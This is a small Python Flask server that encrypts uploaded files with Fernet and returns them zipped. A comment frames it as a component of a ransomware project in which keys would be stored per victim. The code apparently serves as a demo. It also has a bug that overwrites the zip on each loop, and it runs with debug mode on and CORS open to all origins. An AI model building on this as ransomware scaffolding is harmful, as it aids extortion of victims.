from flask import Flask, request, send_file
from flask_cors import CORS
import os
import tempfile
import zipfile
from cryptography.fernet import Fernet

def create_key(key_filename="crypt_key.key") :
    key = Fernet.generate_key()
    with open(key_filename, 'wb') as f:
        f.write(key)

def load_key(key_filename = "crypt_key.key") :
    with open(key_filename, 'rb') as file :
        key = file.read() 
    return key 

def encrypt(file, key) :
    file.filename = file.filename + ".enc"
    fernet = Fernet(key)
    return fernet.encrypt(file.read()) 

app = Flask(__name__)
CORS(app, origins=["*"])

@app.route('/cryp', methods=['POST'])
def encrypt_files() :
    #Check if we receive some files from the website
    if 'files' not in request.files :
        return "No files uploaded", 400
    
    #Create and load the key
    #In a working ransomware this key should be send in a db with an id for each victim
    create_key()
    key = load_key()

    #Create files array
    files = request.files.getlist('files')

    #Create the .zip
    tmp_fd, tmp_path = tempfile.mkstemp(suffix=".zip")
    os.close(tmp_fd)

    #Take the original files, encrypt them and put them into the zip
    for file in files : 
        file_name = file.filename
        print(f"received : {file_name}", flush=True)
        enc_data = encrypt(file, key)
        with zipfile.ZipFile(tmp_path, 'w') as zf :
            zf.writestr(file_name+".encrypt", enc_data)

    return send_file(tmp_path, as_attachment=True, download_name="files")

if __name__ == "__main__" :
    app.run(port=5000, debug=True)